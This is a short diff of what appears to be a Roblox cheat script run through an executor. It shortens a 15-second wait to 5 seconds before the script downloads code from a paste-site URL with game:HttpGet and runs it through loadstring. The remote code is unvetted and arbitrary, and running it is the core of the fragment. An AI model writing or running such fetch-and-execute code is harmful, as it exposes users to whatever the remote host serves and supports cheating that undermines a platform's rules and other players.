@@ -309,13 +309,13 @@ task.spawn(function()
 
             if pos == Vector3.new(57.00, 3.00, -49032) then            
                 warn("Attempting to load external script after final position - This will likely fail on client.")
-                print("Reached final position, waiting 15 seconds...")
-                task.wait(15)
+                print("Reached final position, waiting 5 seconds...")
+                task.wait(5)
                  local success, err = pcall(function()
                      loadstring(game:HttpGet("https://hst.sh/raw/nawinocofa"))()
                  end)
                  if success then
-                    print("Executed loadstring after 15 seconds.")
+                    print("Executed loadstring after 5 seconds.")
                  else
                     warn("Failed to execute loadstring after final position: " .. tostring(err))
                  end
